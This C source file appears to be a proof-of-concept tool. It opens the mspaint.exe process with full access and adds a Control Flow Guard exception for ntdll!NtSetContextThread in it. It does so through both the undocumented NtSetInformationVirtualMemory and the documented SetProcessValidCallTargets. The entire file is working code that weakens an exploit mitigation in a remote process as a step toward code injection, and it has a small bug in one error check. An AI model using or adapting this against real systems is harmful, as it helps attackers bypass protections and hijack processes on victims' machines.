#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

#define NTDLL ("ntdll.dll")
#define KERNELBASE ("kernelbase.dll")
#define NTSETCONTEXTTHREAD ("NtSetContextThread")
#define NTSETINFORMATIONVIRTUALMEMORY ("NtSetInformationVirtualMemory")
#define SETPROCESSVALIDCALLTARGETS ("SetProcessValidCallTargets")

#define TARGET_PROCESS_NAME (L"mspaint.exe")

#define CFG_CALL_TARGET_VALID (0x00000001)

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS
{
	VmPrefetchInformation,
	VmPagePriorityInformation,
	VmCfgCallTargetInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct _MEMORY_RANGE_ENTRY
{
	PVOID	VirtualAddress;
	SIZE_T	NumberOfBytes;
} MEMORY_RANGE_ENTRY, *PMEMORY_RANGE_ENTRY;

typedef struct _CFG_CALL_TARGET_INFO {
	ULONG_PTR	Offset;
	ULONG_PTR	Flags;
} CFG_CALL_TARGET_INFO, *PCFG_CALL_TARGET_INFO;

typedef struct _VM_INFORMATION
{
	DWORD					dwNumberOfOffsets;
	PVOID					dwMustBeZero;
	PDWORD					pdwOutput;
	PCFG_CALL_TARGET_INFO	ptOffsets;
} VM_INFORMATION, *PVM_INFORMATION;

typedef NTSTATUS(NTAPI *_NtSetInformationVirtualMemory)(
	HANDLE								hProcess, 
	VIRTUAL_MEMORY_INFORMATION_CLASS	VmInformationClass,
	ULONG_PTR							NumberOfEntries,
	PMEMORY_RANGE_ENTRY					VirtualAddresses,
	PVOID								VmInformation, 
	ULONG								VmInformationLength
);

typedef BOOL (WINAPI *_SetProcessValidCallTargets)(
	HANDLE					hProcess,
	PVOID					VirtualAddress,
	SIZE_T					RegionSize,
	ULONG					NumberOfOffsets,
	PCFG_CALL_TARGET_INFO	OffsetInformation
);

typedef enum _ESTATUS
{
	ESTATUS_INVALID = -1,
	ESTATUS_SUCCESS = 0,

	ESTATUS_GETFUNCTIONADDRESSFROMDLL_GETMODULEHANDLEA_FAILED = 0x100,
	ESTATUS_GETFUNCTIONADDRESSFROMDLL_GETPROCADDRESS_FAILED,

	ESTATUS_GETMEMORYALLOCATIONBASEANDREGIONSIZE_VIRTUALQUERY_FAILED,
	
	ESTATUS_OPENPROCESSBYNAME_OPENPROCESS_ERROR,

	ESTATUS_GETPROCESSIDBYNAME_CREATETOOLHELP32SNAPSHOT_ERROR,
	ESTATUS_GETPROCESSIDBYNAME_PROCESS32FIRST_ERROR,
	ESTATUS_GETPROCESSIDBYNAME_PROCESS_NOT_FOUND,

	ESTATUS_ADDCFGEXCEPTIONUNDOCUMENTEDAPI_NTSETINFORMATIONVIRTUALMEMORY_FAILED,

	ESTATUS_ADDCFGEXCEPTIONDOCUMENTEDAPI_SETPROCESSVALIDCALLTARGETS_FAILED,
} ESTATUS, *PESTATUS;

#define ESTATUS_FAILED(eStatus) (ESTATUS_SUCCESS != eStatus)

ESTATUS GetFunctionAddressFromDll(
	PSTR pszDllName, 
	PSTR pszFunctionName, 
	PVOID *ppvFunctionAddress
	)
{
	HMODULE hModule = NULL;
	PVOID	pvFunctionAddress = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		eReturn = ESTATUS_GETFUNCTIONADDRESSFROMDLL_GETMODULEHANDLEA_FAILED;
		goto lblCleanup;
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == hModule)
	{
		eReturn = ESTATUS_GETFUNCTIONADDRESSFROMDLL_GETPROCADDRESS_FAILED;
		goto lblCleanup;
	}

	*ppvFunctionAddress = pvFunctionAddress;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}


ESTATUS GetMemoryAllocationBaseAndRegionSize(
	PVOID pvAddress, 
	PVOID *ppvAllocationBase, 
	PSIZE_T pstRegionSize
	)
{
	SIZE_T						stErr = 0;
	ESTATUS						eReturn = ESTATUS_INVALID;
	MEMORY_BASIC_INFORMATION	tMemoryBasicInformation = { 0 };
	
	stErr = VirtualQuery(
		pvAddress,
		&tMemoryBasicInformation,
		sizeof(tMemoryBasicInformation)
		);
	if (0 == stErr)
	{
		eReturn = ESTATUS_GETMEMORYALLOCATIONBASEANDREGIONSIZE_VIRTUALQUERY_FAILED;
		goto lblCleanup;
	}

	*ppvAllocationBase = tMemoryBasicInformation.AllocationBase;
	*pstRegionSize = tMemoryBasicInformation.RegionSize;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}


ESTATUS GetProcessIdByName(
	LPWSTR pszProcessName, 
	PDWORD pdwProcessId
	)
{
	PROCESSENTRY32	pe = { 0 };
	DWORD			dwProcessId = 0;
	HANDLE			hSnapshot = NULL;
	ESTATUS			eReturn = ESTATUS_INVALID;
	
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (NULL == hSnapshot)
	{
		eReturn = ESTATUS_GETPROCESSIDBYNAME_CREATETOOLHELP32SNAPSHOT_ERROR;
		printf("[*] CreateToolhelp32Snapshot error. GLE: %d.\n\n\n", GetLastError());
		goto lblCleanup;
	}

	pe.dwSize = sizeof(PROCESSENTRY32);
	if (FALSE == Process32First(hSnapshot, &pe))
	{
		eReturn = ESTATUS_GETPROCESSIDBYNAME_PROCESS32FIRST_ERROR;
		printf("[*] Process32First error. GLE: %d.\n\n\n", GetLastError());
		goto lblCleanup;
	}

	do
	{
		if (NULL != wcsstr(pe.szExeFile, pszProcessName))
		{
			dwProcessId = pe.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapshot, &pe));

	if (0 == dwProcessId)
	{
		printf("[*] Process '%S' could not be found.\n\n\n", pszProcessName);
		eReturn = ESTATUS_GETPROCESSIDBYNAME_PROCESS_NOT_FOUND;
		goto lblCleanup;
	}

	printf("[*] Found process '%S'. PID: %d (0x%X).\n\n\n", pszProcessName, dwProcessId, dwProcessId);
	*pdwProcessId = dwProcessId;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	if (NULL != hSnapshot)
	{
		CloseHandle(hSnapshot);
		hSnapshot = NULL;
	}

	return eReturn;

}

ESTATUS OpenProcessByName(
	LPWSTR pszProcessName, 
	PHANDLE phProcess
	)
{
	DWORD	dwPid = 0;
	HANDLE	hProcess = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;
	
	eReturn = GetProcessIdByName(pszProcessName, &dwPid);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		dwPid
		);
	if (NULL == hProcess)
	{
		eReturn = ESTATUS_OPENPROCESSBYNAME_OPENPROCESS_ERROR;
		printf("[*] OpenProcess error. GLE: %d.\n\n\n", GetLastError());
		goto lblCleanup;
	}

	printf("[*] Opened process's handle: %d (0x%X).\n\n\n", hProcess, hProcess);
	*phProcess = hProcess;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:

	return eReturn;
}

ESTATUS AddCfgExceptionUndocumentedApi(HANDLE hProcess, PVOID pvAddress)
{
	DWORD							dwOutput = 0;
	NTSTATUS						ntStatus = 0;
	SIZE_T							stRegionSize = 0;
	VM_INFORMATION					tVmInformation = { 0 };
	PVOID							pvAllocationBase = NULL;
	ESTATUS							eReturn = ESTATUS_INVALID;
	MEMORY_RANGE_ENTRY				tVirtualAddresses = { 0 };
	CFG_CALL_TARGET_INFO			tCfgCallTargetInfo = { 0 };
	_NtSetInformationVirtualMemory	pfnNtSetInformationVirtualMemory = NULL;
	
	// Get the address of ntdll!NtSetInformationVirtualMemory
	eReturn = GetFunctionAddressFromDll(
		NTDLL, 
		NTSETINFORMATIONVIRTUALMEMORY, 
		(PVOID *) &pfnNtSetInformationVirtualMemory
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = GetMemoryAllocationBaseAndRegionSize(
		pvAddress, 
		&pvAllocationBase, 
		&stRegionSize
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	tCfgCallTargetInfo.Flags = CFG_CALL_TARGET_VALID;
	tCfgCallTargetInfo.Offset = (ULONG_PTR)pvAddress - (ULONG_PTR)pvAllocationBase;

	tVirtualAddresses.NumberOfBytes = stRegionSize;
	tVirtualAddresses.VirtualAddress = pvAllocationBase;
	tVmInformation.dwNumberOfOffsets = 0x1;
	tVmInformation.dwMustBeZero = 0x0;
	tVmInformation.pdwOutput = &dwOutput;
	tVmInformation.ptOffsets = &tCfgCallTargetInfo;

	printf("[*] Adding a CFG exception for 0x%X using NtSetInformationVirtualMemory.\n\n\n", pvAddress);
	ntStatus = pfnNtSetInformationVirtualMemory(
		hProcess, 
		VmCfgCallTargetInformation, 
		1, 
		&tVirtualAddresses, 
		&tVmInformation, 
		0x10
		);
	if (0 != ntStatus)
	{
		eReturn = ESTATUS_ADDCFGEXCEPTIONUNDOCUMENTEDAPI_NTSETINFORMATIONVIRTUALMEMORY_FAILED;
		goto lblCleanup;
	}

	printf("[*] Exception added successfully.\n\n\n");
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}

ESTATUS AddCfgExceptionDocumentedApi(HANDLE hProcess, PVOID pvAddress)
{
	BOOL						bReturn = FALSE;
	SIZE_T						stRegionSize = NULL;
	PVOID						pvAllocationBase = NULL;
	ESTATUS						eReturn = ESTATUS_INVALID;
	CFG_CALL_TARGET_INFO		tCfgCallTargetInfo = { 0 };
	_SetProcessValidCallTargets	pfnSetProcessValidCallTargets = NULL;
	
	// Get the address of KernelBase!SetProcessValidCallTargets
	eReturn = GetFunctionAddressFromDll(
		KERNELBASE, 
		SETPROCESSVALIDCALLTARGETS, 
		(PVOID *) &pfnSetProcessValidCallTargets
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = GetMemoryAllocationBaseAndRegionSize(
		pvAddress, 
		&pvAllocationBase, 
		&stRegionSize
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	tCfgCallTargetInfo.Flags = CFG_CALL_TARGET_VALID;
	tCfgCallTargetInfo.Offset = (ULONG_PTR)pvAddress - (ULONG_PTR)pvAllocationBase;

	printf("[*] Adding a CFG exception for 0x%X using SetProcessValidCallTargets.\n\n\n", pvAddress);
	bReturn = pfnSetProcessValidCallTargets(
		hProcess, 
		pvAllocationBase, 
		stRegionSize, 
		0x1, 
		&tCfgCallTargetInfo
		);
	if (FALSE == bReturn)
	{
		eReturn = ESTATUS_ADDCFGEXCEPTIONDOCUMENTEDAPI_SETPROCESSVALIDCALLTARGETS_FAILED;
		goto lblCleanup;
	}

	printf("[*] Exception added successfully.\n\n\n");
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}

int main()
{
	HANDLE	hProcess = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;
	PVOID	pvAddressToAddCfgExceptionTo = NULL;

	// Get the address of ntdll!NtSetContextThread
	eReturn = GetFunctionAddressFromDll(
		NTDLL, 
		NTSETCONTEXTTHREAD, 
		&pvAddressToAddCfgExceptionTo
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = OpenProcessByName(TARGET_PROCESS_NAME, &hProcess);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	// Add a CFG exception using ntdll!NtSetInformationVirtualMemory
	eReturn = AddCfgExceptionUndocumentedApi(
		hProcess,
		pvAddressToAddCfgExceptionTo
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}
	
	// Add a CFG exception using KernelBase!SetProcessValidCallTargets
	eReturn = AddCfgExceptionDocumentedApi(
		hProcess, 
		pvAddressToAddCfgExceptionTo
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}
	
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	if (NULL != hProcess)
	{
		CloseHandle(hProcess);
		hProcess = NULL;
	}

	return eReturn;
}